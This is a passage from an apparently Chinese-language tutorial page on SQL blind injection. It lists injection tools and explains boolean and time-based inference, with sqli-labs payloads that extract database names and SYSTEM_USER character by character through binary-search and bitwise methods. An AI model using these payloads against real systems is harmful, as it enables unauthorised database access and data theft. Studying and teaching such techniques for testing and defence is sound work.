&lt;li&gt;&lt;p&gt;Havij (&lt;a href=&#34;http://itsecteam.com/en/projects/projectl.htm&#34;&gt;http://itsecteam.com/en/projects/projectl.htm&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Sqllnjector (&lt;a href=&#34;http://www.woanware.co.uk/?page_id=19&#34;&gt;http://www.woanware.co.uk/?page_id=19&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SQLGET (&lt;a href=&#34;http://www.infbbytecom.ar/&#34;&gt;www.infbbytecom.ar&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Sqlsus (&lt;a href=&#34;http://sqlsus.sourcefbrge.net/&#34;&gt;http://sqlsus.sourcefbrge.net/&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Pangolin (&lt;a href=&#34;http://www.nosec-inc.com/en/products/pangolin/&#34;&gt;http://www.nosec-inc.com/en/products/pangolin/&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Absinthe (&lt;a href=&#34;http://0x90.org/releases/absinthe/&#34;&gt;http://0x90.org/releases/absinthe/&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;SQL盲注利用&#34;&gt;&lt;a href=&#34;#SQL盲注利用&#34; class=&#34;headerlink&#34; title=&#34;SQL盲注利用&#34;&gt;&lt;/a&gt;SQL盲注利用&lt;/h2&gt;&lt;p&gt;在发现一个SQL注入点时，只返回一个简单错误提示，返回的内容并不能完美的达到预期，这时我们能注入不同的内容注入产生不同回应，通过差异判断注入是否成功，这就是SQL盲注，通常是自动化利用&lt;/p&gt;
&lt;h3 id=&#34;寻找并确认SQL盲注&#34;&gt;&lt;a href=&#34;#寻找并确认SQL盲注&#34; class=&#34;headerlink&#34; title=&#34;寻找并确认SQL盲注&#34;&gt;&lt;/a&gt;寻找并确认SQL盲注&lt;/h3&gt;&lt;h4 id=&#34;强制产生通用错误&#34;&gt;&lt;a href=&#34;#强制产生通用错误&#34; class=&#34;headerlink&#34; title=&#34;强制产生通用错误&#34;&gt;&lt;/a&gt;强制产生通用错误&lt;/h4&gt;&lt;p&gt;通常提交单引号时最常见的错误源是受损的SQL查询&lt;/p&gt;
&lt;h4 id=&#34;注入带副作用的查询&#34;&gt;&lt;a href=&#34;#注入带副作用的查询&#34; class=&#34;headerlink&#34; title=&#34;注入带副作用的查询&#34;&gt;&lt;/a&gt;注入带副作用的查询&lt;/h4&gt;&lt;p&gt;注入副作用的查询是为了让攻击者观察到，通常是注入时间延迟&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;waitfor&lt;/span&gt; delay &lt;span class=&#34;token string&#34;&gt;&#39;0:0:5&#39;&lt;/span&gt;

sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

pg_sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt; 注入不同的字符串产生不同的输出&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39; and &#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;=&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;-- 永假&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39; or &#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;=&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- 永真&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;拆分与平衡&#34;&gt;&lt;a href=&#34;#拆分与平衡&#34; class=&#34;headerlink&#34; title=&#34;拆分与平衡&#34;&gt;&lt;/a&gt;拆分与平衡&lt;/h4&gt;&lt;p&gt;分解合法输入的操作称为拆分，平衡则保证最终的查询中不会包含不平衡的结尾单引号。其基本思想是：收集合法的请求参数，之后使用SQL关键字对它们进行修改以保证与原始数据不同， 但当数据库解析它们时，二者的功能是等价的。&lt;/p&gt;
&lt;p&gt;oracle中&lt;code&gt;||&lt;/code&gt;连接两个字符串&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadB&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ob&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 返回结果是相同的&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review authors&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Mad&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;CHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x42&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ob&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Mad&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;B&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ob&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Mad&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;B&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ob&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Mad&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Bob&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们可以看到，在其中注入了子查询，当然我们可以换成其他的漏洞代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/1635b29c12fca4d4f03c3fa7f6557976.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;常见的SQL盲注场景&#34;&gt;&lt;a href=&#34;#常见的SQL盲注场景&#34; class=&#34;headerlink&#34; title=&#34;常见的SQL盲注场景&#34;&gt;&lt;/a&gt;常见的SQL盲注场景&lt;/h4&gt;&lt;p&gt;1） 提交一个导致SQL查询无效的漏洞时会返回一个通用的错误页面，而提交正确的SQL时则会返回一个内容可被适度控制的页面。这种情况通常出现在根据用户选择来显示信息的页面中。例如，用户点击一个包含id参数（能唯一识别数据库中的商品）的链接或者提交一个搜索请求。对于这两种情况，用户可控制页面提供的输出，因为该页面是根据用户提供的信息来生成的，比如提供一个产品的id，该页面还包含了从响应中获得的数据。&lt;/p&gt;
&lt;p&gt;因为页面提供了反馈信息（虽然不是以详细的数据库错误消息方式），所以可以使用基于时间的确认漏洞以及能够修改页面显示数据集的漏洞。例如，某个攻击可能会显示香皂或刷子的产品描述，以指示是否提取到了 0-bit或1-bit的数据。大多数情况下，只需提交一个单引号就足以破坏SQL查询平衡并强制产生一个通用的错误页面，这将有助于推断是否存在SQL注入漏洞。&lt;/p&gt;
&lt;p&gt;2） 提交一个导致SQL查询无效的漏洞时会返回一个通用的错误页面，而提交正确的SQL时则会返回一个内容不可控的页面。当页面包含多个SQL查询，但只有第一个查询容易受到攻击且不产生输出时会碰到这种情况。还有一种场景也会引发这种情况：SQL注入位于 UPDATE或INSERT语句中，此时提交的信息虽然被写入数据库中且不产生输出，但却会产生通用的错误。&lt;/p&gt;
&lt;p&gt;使用单引号产生的通用错误页面可能会暴露这种页面（与基于时间的漏洞相同），但基于内容的攻击却不会。&lt;/p&gt;
&lt;p&gt;3） 提交受损或不正确的SQL既不会产生错误页面，也不会以任何方式影响页面输出。因 为这种类型的SQL盲注场景不返回错误，而基于时间的漏洞或产生带外副作用的漏洞则最有可能成功识别易受攻击的参数。&lt;/p&gt;
&lt;h4 id=&#34;SQL盲注技术&#34;&gt;&lt;a href=&#34;#SQL盲注技术&#34; class=&#34;headerlink&#34; title=&#34;SQL盲注技术&#34;&gt;&lt;/a&gt;SQL盲注技术&lt;/h4&gt;&lt;h5 id=&#34;推断攻击技术&#34;&gt;&lt;a href=&#34;#推断攻击技术&#34; class=&#34;headerlink&#34; title=&#34;推断攻击技术&#34;&gt;&lt;/a&gt;推断攻击技术&lt;/h5&gt;&lt;p&gt;当请求的位为1时，响应会有专门的标志；而当请求的位为0时，则会产生不同的响应。响应中的真正差异取决于所选用的推断工具，所使用的方法则大多基于响应时间、页面内容、页面错误或以上这些因素的组合。&lt;/p&gt;
&lt;p&gt;条件分支IF语句，攻击者能通过响应的不同推断出是哪个分支&lt;/p&gt;
&lt;p&gt;sqli-labs示例&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-8/?id=1&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#you are in&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-8/?id=1&#39; and &#39;1&#39;=&#39;1&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#you are in&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-8/?id=1&#39; and &#39;1&#39;=&#39;2&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-8/?id=1&#39; or &#39;1&#39;=&#39;1&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#you are in&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#可以看到有两种状态，空白和you are in&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-8/?id=1&#39; and (ascii(substr((select database()),1,1)))=115 %23&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#you are in&lt;/span&gt;
可以判断数据库第一个字符是s
http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-8/?id=1&#39; and (ascii(substr((select database()),2,1)))=101 %23&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#you are in&lt;/span&gt;
经过多次注入就能将数据全部检索出来
http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-8/?id=1&#39; and (length(database()))=8 %23&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#you are in&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;增加推断攻击技术的复杂性&#34;&gt;&lt;a href=&#34;#增加推断攻击技术的复杂性&#34; class=&#34;headerlink&#34; title=&#34;增加推断攻击技术的复杂性&#34;&gt;&lt;/a&gt;增加推断攻击技术的复杂性&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;二分搜素方法（分半算法）&lt;/p&gt;
&lt;p&gt;两种状态，添加第三种状态可以将最佳请求次数降为1，也可以自己创建字母表&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Incubating&lt;span class=&#34;token string&#34;&gt;&#39; AND ASCII(SUBSTRING (SYSTEM USER, 1, 1)) &amp;gt;127-- (False)
Incubating&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SYSTEM &lt;span class=&#34;token keyword&#34;&gt;USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;63&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- (True)&lt;/span&gt;
Incubating&lt;span class=&#34;token string&#34;&gt;&#39; AND ASCII(SUBSTRING (SYSTEM USER, 1, 1) )&amp;gt;95-- (True)
Incubating&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SYSTEM &lt;span class=&#34;token keyword&#34;&gt;USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;111&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- (True)&lt;/span&gt;
Incubating&lt;span class=&#34;token string&#34;&gt;&#39; AND ASCII(SUBSTRING (SYSTEM USER,1,1)) &amp;gt;119-- (False)
Incubating&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SYSTEM &lt;span class=&#34;token keyword&#34;&gt;USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- (False)&lt;/span&gt;
Incubating&lt;span class=&#34;token string&#34;&gt;&#39; AND ASCII(SUBSTRING (SYSTEM USER,1,1)) &amp;gt;113-- (True)
Incubating&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SYSTEM &lt;span class=&#34;token keyword&#34;&gt;USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- (True)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;-- 自建字母表，优化二分法&lt;/span&gt;
Incubating&lt;span class=&#34;token string&#34;&gt;&#39; and SUBSTRING (&#39;&lt;/span&gt;c4ca4238a0b923820dcc509a6f75849b&lt;span class=&#34;token string&#34;&gt;&#39;,1,1) in
(&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;逐位方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/304ab8debee5bb56e02a5703f7ad7fba.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;对每位（bit）进行比对&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Incubating&lt;span class=&#34;token string&#34;&gt;&#39;
AND ASCII (SUBSTRING (SYSTEM USER, 1, 1)) &amp;amp;
128-128-- (False)
Incubating&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; ASCII &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SYSTEM &lt;span class=&#34;token keyword&#34;&gt;USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;
&lt;span class=&#34;token number&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- (True)&lt;/span&gt;
Incubating&lt;span class=&#34;token string&#34;&gt;&#39;
AND ASCII (SUBSTRING (SYSTEM USER, 1,1)) &amp;amp;
32=32-- (True)
Incubating&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; ASCII &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SYSTEM &lt;span class=&#34;token keyword&#34;&gt;USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- (True)&lt;/span&gt;
Incubating&lt;span class=&#34;token string&#34;&gt;&#39; AND ASCII (SUBSTRING (SYSTEM USER, 1, 1)) &amp;amp; 8=8-- (False)
Incubating&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; ASCII &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SYSTEM &lt;span class=&#34;token keyword&#34;&gt;USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token 